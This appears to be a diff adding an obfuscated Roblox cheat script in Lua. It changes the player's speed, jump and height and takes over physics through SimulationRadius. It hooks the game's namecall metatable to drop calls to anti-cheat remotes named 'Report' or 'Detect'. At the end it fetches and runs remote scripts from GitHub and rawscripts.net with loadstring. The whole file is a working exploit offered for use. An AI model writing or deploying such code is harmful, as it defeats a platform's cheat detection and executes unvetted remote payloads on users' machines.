@@ -1,0 +1,88 @@
+-- [[ ENCRYPTED CONFIGURATION ]]
+local _0xGhost = {
+    ["\101\110\97\98\108\101\100"] = true, -- enabled
+    _H = 2.8, 
+    _S = 100, 
+    _J = 150, 
+    _HB = 25,
+    _SF = -12
+}
+
+-- [[ SERVICE DECRYPTION ]]
+local function _get(s) return game:GetService(s) end
+local _P = _get("\80\108\97\121\101\114\115")
+local _RS = _get("\82\117\110\83\101\114\118\105\99\101")
+local _UIS = _get("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101")
+local _LP = _P.LocalPlayer
+
+-- [[ DYNAMIC VM INTERPRETER ]]
+local function _Execute_Core(mode, target)
+    if mode == 0x1 then -- Character Mod
+        local c = target or _LP.Character
+        if not c then return end
+        
+        local hum = c:FindFirstChildOfClass("\72\117\109\97\110\111\105\100")
+        if hum then
+            hum.HipHeight = _0xGhost._H
+            -- Anti-Animation Logic
+            for _, v in pairs(hum:GetPlayingAnimationTracks()) do v:Stop() end
+        end
+        
+        -- Smooth Fall Implementation
+        local root = c:WaitForChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116", 5)
+        if root then
+            if root:FindFirstChild("SF_BV") then root.SF_BV:Destroy() end
+            local bv = Instance.new("\66\111\100\121\86\101\108\111\99\105\116\121")
+            bv.Name = "SF_BV"
+            bv.MaxForce = Vector3.new(0, 0, 0)
+            bv.Velocity = Vector3.new(0, _0xGhost._SF, 0)
+            bv.Parent = root
+        end
+    end
+end
+
+-- [[ METATABLE BYPASS ]]
+local function _Hook()
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    local old = mt.__namecall
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        -- Bypass Remote Detectors
+        if method == "\70\105\114\101\83\101\114\118\101\114" and (self.Name:find("Report") or self.Name:find("Detect")) then
+            return nil
+        end
+        return old(self, ...)
+    end)
+    setreadonly(mt, true)
+end
+
+-- [[ RUNTIME LOOPS ]]
+_RS.Stepped:Connect(function()
+    pcall(function()
+        if _LP.Character and _LP.Character:FindFirstChildOfClass("Humanoid") then
+            local h = _LP.Character.Humanoid
+            h.WalkSpeed = _0xGhost._S
+            h.JumpPower = _0xGhost._J
+            
+            -- Hidden Physics
+            sethiddenproperty(_LP, "SimulationRadius", 1/0)
+        end
+    end)
+end)
+
+-- [[ INITIALIZE ]]
+_Hook()
+_Execute_Core(0x1)
+_LP.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    _Execute_Core(0x1, char)
+end)
+
+-- Load Secondary Payloads
+task.spawn(function()
+    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
+    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-invisible-Script-82469"))() end)
+end)
+
+print(">> [ SYSTEM ENCRYPTED & LOADED ] <<")
